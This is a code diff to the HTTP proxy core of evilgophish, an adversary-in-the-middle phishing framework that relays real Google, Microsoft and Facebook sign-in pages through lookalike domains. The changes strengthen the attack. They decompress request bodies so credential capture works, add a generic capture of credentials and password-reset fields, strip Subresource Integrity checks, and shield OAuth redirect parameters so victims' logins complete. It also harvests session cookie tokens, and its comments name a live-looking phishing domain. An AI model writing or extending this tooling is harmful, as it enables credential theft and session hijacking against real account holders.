@@ -10,8 +10,9 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"compress/gzip"
+	"compress/zlib"
 	"crypto/rand"
-	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
@@ -35,6 +36,8 @@ import (
 	"time"
 
 	//. "golang.org/x/net/proxy"
+
+	"evilgophish/shared/rid"
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
@@ -164,20 +167,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Regular expression to detect turnstile requests
 	urlPattern := regexp.MustCompile(`/validate-captcha`)
 
-	// Only intercept /validate-captcha requests containing client_id
+	// Only intercept /validate-captcha requests containing user_id
 	p.Proxy.OnRequest(goproxy.UrlMatches(urlPattern)).DoFunc(
 		func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			// Check if the query string contains the client_id parameter
-			clientID := req.URL.Query().Get("client_id")
+			// Check if the query string contains the user_id parameter
+			clientID := req.URL.Query().Get("user_id")
 			if clientID != "" {
-				//fmt.Println("URL matches pattern, client_id found:", clientID)
+				//fmt.Println("URL matches pattern, user_id found:", clientID)
 				// Modify the request to forward it to the local server
 				req.URL.Scheme = "http"
 				req.URL.Host = "localhost:80"
 				// Forward the modified request
 				return req, nil
 			}
-			// If client_id is not present or not needed, you can decide how to handle this case.
+			// If user_id is not present or not needed, you can decide how to handle this case.
 			// For example, return the request unmodified, modify it in some other way, or even return a custom response.
 			return req, nil
 		},
@@ -656,16 +659,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// replace "Host" header
-				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+				// replace "Host" header - session-aware so every request of one
+				// flow is forwarded to the SAME upstream backend (the map-order
+				// variant answers shared phish hosts randomly per call)
+				if r_host, ok := p.replaceHostWithOriginalForSession(req.Host, ps.PhishletName); ok {
 					req.Host = r_host
 				}
 
-				// fix origin
-				origin := req.Header.Get("Origin")
-				if origin != "" {
-					if o_url, err := url.Parse(origin); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+			// fix origin
+			origin := req.Header.Get("Origin")
+			if origin != "" {
+				if o_url, err := url.Parse(origin); err == nil {
+						if r_host, ok := p.replaceHostWithOriginalForSession(o_url.Host, ps.PhishletName); ok {
 							o_url.Host = r_host
 							req.Header.Set("Origin", o_url.String())
 						}
@@ -674,6 +679,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
+
+				// only advertise response encodings we can decode on the way back,
+				// so rewritten URLs and injected scripts keep working on the real
+				// content (brotli/zstd responses would otherwise pass through as
+				// opaque bytes and every filter would silently miss)
+				req.Header.Set("Accept-Encoding", "gzip, deflate")
 
 				// fix sec-fetch-dest
 				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
@@ -687,7 +698,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				referer := req.Header.Get("Referer")
 				if referer != "" {
 					if o_url, err := url.Parse(referer); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+						if r_host, ok := p.replaceHostWithOriginalForSession(o_url.Host, ps.PhishletName); ok {
 							o_url.Host = r_host
 							req.Header.Set("Referer", o_url.String())
 						}
@@ -708,13 +719,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// set session before cred check
-				session := p.sessions[ps.SessionId]
+				var session *Session
+				if ps.SessionId != "" {
+					session = p.sessions[ps.SessionId]
+				}
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
+						// decompress compressed request bodies so credential capture
+						// can inspect the actual payload (the compressed bytes are
+						// forwarded upstream, but we parse the decompressed data)
+						if enc := req.Header.Get("Content-Encoding"); enc != "" {
+							body = decompressBody(body, enc)
+							req.Header.Del("Content-Encoding")
+						}
+
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
@@ -924,15 +946,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 							}
-
 						}
+
+						// generic credential + password-reset flow capture (fallback when
+						// the phishlet's own regexes don't match the current payload)
+						p.captureGenericFields(session, ps.SessionId, req.URL.Path, body, contentType)
+
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
 				// check if request should be intercepted
 				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+					if r_host, ok := p.replaceHostWithOriginalForSession(req.Host, ps.PhishletName); ok {
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
@@ -964,8 +990,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
-
-			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
 			if ps.SessionId != "" {
@@ -980,17 +1004,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" && allow_origin != "*" {
-				if u, err := url.Parse(allow_origin); err == nil {
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-					}
-				} else {
-					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
+		allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
+		if allow_origin != "" && allow_origin != "*" {
+			if u, err := url.Parse(allow_origin); err == nil {
+				if o_host, ok := p.replaceHostWithPhishedForSession(u.Host, ps.PhishletName); ok {
+					resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
 				}
-				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+			} else {
+				log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 			}
+			resp.Header.Set("Access-Control-Allow-Credentials", "true")
+		} else if allow_origin == "" {
+			// Upstream hosts serve static bundles (JS/CSS/fonts) same-origin
+			// and send no ACAO header. Through the proxy those loads become
+			// cross-subdomain (e.g. accounts.<phish> loading a CORS-mode
+			// script from www.<phish>) and the browser blocks them, which
+			// silently kills the whole page app (dead buttons on Google
+			// sign-in). Allow cross-origin reads of static subresources.
+			// Explicit upstream values above are never overridden, and HTML
+			// documents / API payloads are left untouched.
+			ct := strings.ToLower(strings.TrimSpace(strings.SplitN(resp.Header.Get("Content-Type"), ";", 2)[0]))
+			switch ct {
+			case "application/javascript", "application/x-javascript",
+				"text/javascript", "text/ecmascript", "application/ecmascript",
+				"text/css", "font/woff", "font/woff2", "font/ttf", "font/otf",
+				"application/font-woff", "application/font-woff2",
+				"image/png", "image/jpeg", "image/gif", "image/svg+xml",
+				"image/webp", "image/x-icon", "image/vnd.microsoft.icon":
+				resp.Header.Set("Access-Control-Allow-Origin", "*")
+			}
+		}
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
@@ -1012,20 +1055,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
+			log.Debug("RESP %s %s%s => %d (upstream=%s phishlet=%s sid=%s)", resp.Request.Method, req_hostname, resp.Request.URL.Path, resp.StatusCode, req_hostname, ps.PhishletName, ps.SessionId)
+
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
-				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+				if r_host, ok := p.replaceHostWithPhishedForSession(r_url.Host, ps.PhishletName); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
 				}
 			}
 
 			// fix cookies
-			pl := p.getPhishletByOrigHost(req_hostname)
+			srv_pl := p.getPhishletByOrigHostForSession(req_hostname, ps.PhishletName)
 			var auth_tokens map[string][]*CookieAuthToken
-			if pl != nil {
-				auth_tokens = pl.cookieAuthTokens
+			if srv_pl != nil {
+				auth_tokens = srv_pl.cookieAuthTokens
 			}
 			is_cookie_auth := false
 			is_body_auth := false
@@ -1051,7 +1096,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					ck.Expires = exptime
 				}
 
-				if pl != nil && ps.SessionId != "" {
+				if srv_pl != nil && ps.SessionId != "" {
 					c_domain := ck.Domain
 					if c_domain == "" {
 						c_domain = req_hostname
@@ -1062,7 +1107,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
-					at := pl.getAuthToken(c_domain, ck.Name)
+					at := srv_pl.getAuthToken(c_domain, ck.Name)
 					if at != nil {
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
@@ -1074,7 +1119,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+				ck.Domain, _ = p.replaceHostWithPhishedForSession(ck.Domain, ps.PhishletName)
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 			if ck.String() != "" {
@@ -1084,10 +1129,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
-			if pl != nil {
+			// decompress the response body so URL rewriting and script injection
+			// operate on the actual content: upstream servers (e.g. facebook)
+			// compress text responses and every filter would otherwise silently
+			// miss, leaving absolute upstream URLs in the page (their XHRs then
+			// die on CORS errors - spinning login buttons, blank recovery pages)
+			if err == nil && len(body) > 0 {
+				if dec, ok := decodeResponseBody(resp, body); ok {
+					body = dec
+				}
+			}
+
+			if srv_pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
-					for k, v := range pl.bodyAuthTokens {
+					for k, v := range srv_pl.bodyAuthTokens {
 						if _, ok := s.BodyTokens[k]; !ok {
 							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
@@ -1101,7 +1157,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 
 					// capture http header tokens
-					for k, v := range pl.httpAuthTokens {
+					for k, v := range srv_pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
 							hv := resp.Request.Header.Get(v.header)
 							if hv != "" {
@@ -1112,13 +1168,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check if we have all tokens
-				if len(pl.authUrls) == 0 {
+				if len(srv_pl.authUrls) == 0 {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
-						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
+						if len(srv_pl.bodyAuthTokens) == len(s.BodyTokens) {
 							is_body_auth = true
 						}
-						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
+						if len(srv_pl.httpAuthTokens) == len(s.HttpTokens) {
 							is_http_auth = true
 						}
 					}
@@ -1171,82 +1227,110 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
-				for site, pl := range p.cfg.phishlets {
-					if p.cfg.IsSiteEnabled(site) {
-						// handle sub_filters
-						sfs, ok := pl.subfilters[req_hostname]
-						if ok {
-							for _, sf := range sfs {
-								var param_ok bool = true
-								if s, ok := p.sessions[ps.SessionId]; ok {
-									var params []string
-									for k := range s.Params {
-										params = append(params, k)
-									}
-									if len(sf.with_params) > 0 {
-										param_ok = false
-										for _, param := range sf.with_params {
-											if stringExists(param, params) {
-												param_ok = true
-												break
-											}
+				// Only rewrite using the phishlet that owns the current session.
+				// Several enabled phishlets may claim the same upstream host (e.g.
+				// o365 and o3652 both proxy login.microsoftonline.com); iterating
+				// every phishlet applied each one's sub_filters to the same body in
+				// random map order, causing the LAST writer to win and injecting the
+				// WRONG phish hostnames (o365 pages rendered with ms2.tsl2 URLs).
+				pl := srv_pl
+				if pl == nil {
+					pl = p.getPhishletByOrigHost(req_hostname)
+				}
+			if pl != nil {
+				// shield validated reply params (redirect_uri/wreply/...) from
+				// rewriting; restored after removeObfuscatedDots below
+				var restoreReply func([]byte) []byte
+				body, restoreReply = protectReplyParams(body, pl)
+				// handle sub_filters
+				sfs, ok := pl.subfilters[req_hostname]
+					if ok {
+						for _, sf := range sfs {
+							var param_ok bool = true
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								var params []string
+								for k := range s.Params {
+									params = append(params, k)
+								}
+								if len(sf.with_params) > 0 {
+									param_ok = false
+									for _, param := range sf.with_params {
+										if stringExists(param, params) {
+											param_ok = true
+											break
 										}
 									}
 								}
-								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-									re_s := sf.regexp
-									replace_s := sf.replace
-									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-									phish_sub, _ := p.getPhishSub(phish_hostname)
+							}
+							if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
+								re_s := sf.regexp
+								replace_s := sf.replace
+								phish_hostname, _ := p.replaceHostWithPhishedForSession(combineHost(sf.subdomain, sf.domain), pl.Name)
+								phish_sub, _ := p.getPhishSub(phish_hostname)
 
-									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
-									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
-									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
-									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-									if ok {
-										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
-										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
-									}
+								re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
+								re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
+								re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+								re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+								re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+								re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+								re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
+								re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+								replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
+								replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
+								replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+								replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
+								replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
+								replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
+								replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
+								replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+								phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+								if ok {
+									replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
+									replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+								}
 
-									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
-									} else {
-										log.Error("regexp failed to compile: `%s`", sf.regexp)
-									}
+								if re, err := regexp.Compile(re_s); err == nil {
+									body = []byte(re.ReplaceAllString(string(body), replace_s))
+								} else {
+									log.Error("regexp failed to compile: `%s`", sf.regexp)
 								}
 							}
 						}
 
-						// handle auto filters (if enabled)
-						if stringExists(mime, p.auto_filter_mimes) {
-							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-									if ph.auto_filter {
-										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
-									}
-								}
-							}
-						}
-						body = []byte(removeObfuscatedDots(string(body)))
 					}
+
+				// handle auto filters (if enabled)
+				if stringExists(mime, p.auto_filter_mimes) {
+					for _, ph := range pl.proxyHosts {
+						if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+							if ph.auto_filter {
+								body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+							}
+						}
+					}
+				}
+				body = []byte(removeObfuscatedDots(string(body)))
+				body = restoreReply(body)
+				}
+
+				// facebook/instagram serve SSR payloads in
+				// <script type="application/json" data-sjs="" data-content-len="N"> blocks.
+				// The upstream value of N is the exact byte length of the JSON content; the
+				// client-side data-sjs reader SKIPS any block whose data-content-len does not
+				// match the actual content length. Hostname rewriting (sub_filters/auto
+				// filters) changes the content length but leaves data-content-len stale, which
+				// silently drops the Bootloader rsrcMaps and ScheduledServerJS module defines
+				// (the Comet app then never attaches its event handlers). Recompute the length
+				// attribute after all rewriting.
+				if stringExists(mime, []string{"text/html"}) {
+					body = fixServerJSContentLen(body)
+					body = stripIntegrityAttributes(body)
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
 
-					if pl != nil && ps.SessionId != "" {
+					if srv_pl != nil && ps.SessionId != "" {
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
 							if s.PhishLure != nil {
@@ -1267,17 +1351,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							if !bytes.Contains(body, []byte(fmt.Sprintf("/s/%s.js", s.Id))) {
+								log.Debug("js_inject: redirect script NOT injected (body has no </body> tag?) for session: %s", s.Id)
+							}
 						}
 					}
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+
+				// the body may have been decompressed or rewritten above - drop
+				// the original length so the client receives the full content
+				// instead of a truncated prefix
+				resp.Header.Del("Content-Length")
+				resp.ContentLength = -1
 			}
 
-			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+			if srv_pl != nil && len(srv_pl.authUrls) > 0 && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
-					for _, au := range pl.authUrls {
+					for _, au := range srv_pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
 							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
 							if err != nil {
@@ -1334,7 +1427,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Set("Cache-Control", "no-cache, no-store")
 			}
 
-			if pl != nil && ps.SessionId != "" {
+			if srv_pl != nil && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
@@ -1412,7 +1505,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
 	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 	if resp != nil {
-		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		redirect_url := "https://" + req.Host + "/validate-captcha?user_id=" + rid
 		resp.Header.Add("Location", redirect_url)
 		return req, resp
 	}
@@ -1463,6 +1556,156 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	return ret
 }
 
+// fixServerJSContentLen recomputes the data-content-len attribute of inline
+// facebook/instagram SSR payload blocks (<script type="application/json"
+// data-sjs="..." data-content-len="N">...</script>) after hostname rewriting.
+// Upstream sets data-content-len to the exact byte length of the JSON content;
+// the client-side data-sjs reader silently skips blocks whose declared length
+// does not match the actual content. Because hostname rewrites change the
+// content length (e.g. https://www.facebook.com/ -> https://www.tsl2.blackyou.dedyn.io/),
+// the attribute goes stale and the affected payloads never execute, leaving the
+// page's event handlers unbound. Only the attribute value is changed, keeping
+// all other markup intact.
+func fixServerJSContentLen(body []byte) []byte {
+	if !bytes.Contains(body, []byte("data-sjs")) {
+		return body
+	}
+	block_re := regexp.MustCompile(`(?sU)<script([^>]*data-sjs[^>]*)>(.*)</script>`)
+	return block_re.ReplaceAllFunc(body, func(m []byte) []byte {
+		parts := block_re.FindSubmatch(m)
+		if parts == nil {
+			return m
+		}
+		tag := string(parts[1])
+		content := parts[2]
+		if !strings.Contains(tag, "data-content-len=\"") {
+			return m
+		}
+		tag = dataContentLenRe.ReplaceAllString(tag, fmt.Sprintf("data-content-len=\"%d\"", len(content)))
+		return []byte("<script" + tag + ">" + string(content) + "</script>")
+	})
+}
+
+var dataContentLenRe = regexp.MustCompile(`data-content-len="\d+"`)
+
+// integrityAttrRe matches SRI integrity attributes on HTML tags:
+//
+//	integrity="sha384-..." | integrity='sha384-...' | integrity=sha384-...
+//
+// The leading \s+ guarantees we only match a real attribute (whitespace
+// separated), never a substring of another attribute/value.
+var integrityAttrRe = regexp.MustCompile(`(?i)\s+integrity\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)`)
+
+// stripIntegrityAttributes removes Subresource Integrity hashes from proxied
+// HTML. Hostname rewriting changes the bytes of proxied scripts/stylesheets,
+// so their content can never match the upstream-provided sha384/sha512 hash
+// again. Browsers refuse to execute a script whose hash mismatches (e.g.
+// Microsoft's ConvergedLogin_PCore_*.js carries an integrity attribute -
+// without stripping, the sign-in page stays blank with only its <title>
+// rendered). A rewriting proxy must drop these attributes; the upstream
+// content itself is still fetched over TLS from the real site.
+func stripIntegrityAttributes(body []byte) []byte {
+	if !bytes.Contains(bytes.ToLower(body), []byte("integrity")) {
+		return body
+	}
+	return integrityAttrRe.ReplaceAll(body, []byte(""))
+}
+
+// replyParamRe matches OAuth/WS-Federation reply parameters whose values the
+// identity provider validates against the client application's registration:
+// redirect_uri, post_logout_redirect_uri and wreply. Matches plain and
+// URL-encoded values:
+//
+//	redirect_uri=https://host/path?a=b
+//	redirect_uri=https%3a%2f%2fhost%2fpath%3fx%3dy
+//
+// The value ends at the first quote, whitespace, '<', '&' or backslash (the
+// latter covers JS \u0026 separators between outer parameters).
+var replyParamRe = regexp.MustCompile(`(?i)(redirect_uri|post_logout_redirect_uri|wreply)=((?:https?%3a|https?:)[^"'\s<&\\]+)`)
+
+// replyParamHost extracts the hostname from a reply-param match value such as
+// "https://host/path?a=b" or "https%3a%2f%2fhost%2fpath%3fx%3dy". Returns the
+// host and true on success.
+func replyParamHost(m []byte) (string, bool) {
+	s := string(m)
+	eq := strings.Index(s, "=")
+	if eq < 0 || eq+1 >= len(s) {
+		return "", false
+	}
+	v := s[eq+1:]
+	var rest string
+	if strings.HasPrefix(v, "https%3a") {
+		rest = v[len("https%3a"):]
+	} else if strings.HasPrefix(v, "https:") {
+		rest = v[len("https:"):]
+	} else if strings.HasPrefix(v, "http%3a") {
+		rest = v[len("http%3a"):]
+	} else if strings.HasPrefix(v, "http:") {
+		rest = v[len("http:"):]
+	} else {
+		return "", false
+	}
+	if strings.HasPrefix(rest, "%2f%2f") {
+		rest = rest[len("%2f%2f"):]
+	} else if strings.HasPrefix(rest, "//") {
+		rest = rest[len("//"):]
+	} else {
+		return "", false
+	}
+	host := ""
+	for i := 0; i < len(rest); i++ {
+		if strings.HasPrefix(rest[i:], "%2f") || strings.HasPrefix(rest[i:], "%3f") || strings.HasPrefix(rest[i:], "%26") {
+			break
+		}
+		c := rest[i]
+		if c == '/' || c == '?' || c == '&' {
+			break
+		}
+		host += string(c)
+	}
+	if host == "" {
+		return "", false
+	}
+	return host, true
+}
+
+// protectReplyParams shields validated reply-parameter values from hostname
+// rewriting (response side only) and returns a restore func that puts the
+// original values back after all rewriting is done. Rewriting a redirect_uri
+// host to a phish domain breaks the flow: unproxied providers receive the
+// phish host directly and reject it with "invalid_request: redirect_uri is not
+// valid". Values whose host IS one of the phishlet's OWN proxied hosts (e.g. a
+// redirect_uri pointing back at login.live.com on the microsoft phishlet) are
+// NOT protected - they must be rewritten so the browser keeps talking to the
+// proxy, which converts them back to the original host on the upstream leg.
+func protectReplyParams(body []byte, pl *Phishlet) ([]byte, func([]byte) []byte) {
+	if !replyParamRe.Match(body) {
+		return body, func(b []byte) []byte { return b }
+	}
+	proxyHostSet := map[string]bool{}
+	if pl != nil {
+		for _, ph := range pl.proxyHosts {
+			proxyHostSet[combineHost(ph.orig_subdomain, ph.domain)] = true
+		}
+	}
+	var saved []string
+	var skipped []string
+	out := replyParamRe.ReplaceAllFunc(body, func(m []byte) []byte {
+		if host, ok := replyParamHost(m); ok && proxyHostSet[host] {
+			skipped = append(skipped, host)
+			return m
+		}
+		saved = append(saved, string(m))
+		return []byte("\x00RPV" + strconv.Itoa(len(saved)-1) + "\x00")
+	})
+	return out, func(b []byte) []byte {
+		for i, s := range saved {
+			b = bytes.ReplaceAll(b, []byte("\x00RPV"+strconv.Itoa(i)+"\x00"), []byte(s))
+		}
+		return b
+	}
+}
+
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
 	for _, v := range vals {
@@ -1484,78 +1727,22 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 	var ret bool = false
 	vals := u.Query()
 
-	var enc_key string
-
 	for _, v := range vals {
-		if len(v[0]) > 8 {
-			enc_key = v[0][:8]
-			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
-			if err == nil {
-				dec_params := make([]byte, len(enc_vals)-1)
-
-				var crc byte = enc_vals[0]
-				c, _ := rc4.NewCipher([]byte(enc_key))
-				c.XORKeyStream(dec_params, enc_vals[1:])
-
-				var crc_chk byte
-				for _, c := range dec_params {
-					crc_chk += byte(c)
-				}
-
-				if crc == crc_chk {
-					params, err := url.ParseQuery(string(dec_params))
-					if err == nil {
-						for kk, vv := range params {
-							log.Debug("param: %s='%s'", kk, vv[0])
-
-							session.Params[kk] = vv[0]
-						}
-						ret = true
-						break
-					}
-				} else {
-					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
-				}
-			} else {
-				log.Debug("extractParams: %s", err)
+		params, err := rid.DecodeParams(v[0])
+		if err != nil {
+			if err == rid.ErrChecksum {
+				log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
 			}
+			continue
 		}
+		for kk, vv := range params {
+			log.Debug("param: %s='%s'", kk, vv[0])
+
+			session.Params[kk] = vv[0]
+		}
+		ret = true
+		break
 	}
-	/*
-		   for k, v := range vals {
-			   if len(k) == 2 {
-				   // possible rc4 encryption key
-				   if len(v[0]) == 8 {
-					   enc_key = v[0]
-					   break
-				   }
-			   }
-		   }
-
-		   if len(enc_key) > 0 {
-			   for k, v := range vals {
-				   if len(k) == 3 {
-					   enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					   if err == nil {
-						   dec_params := make([]byte, len(enc_vals))
-
-						   c, _ := rc4.NewCipher([]byte(enc_key))
-						   c.XORKeyStream(dec_params, enc_vals)
-
-						   params, err := url.ParseQuery(string(dec_params))
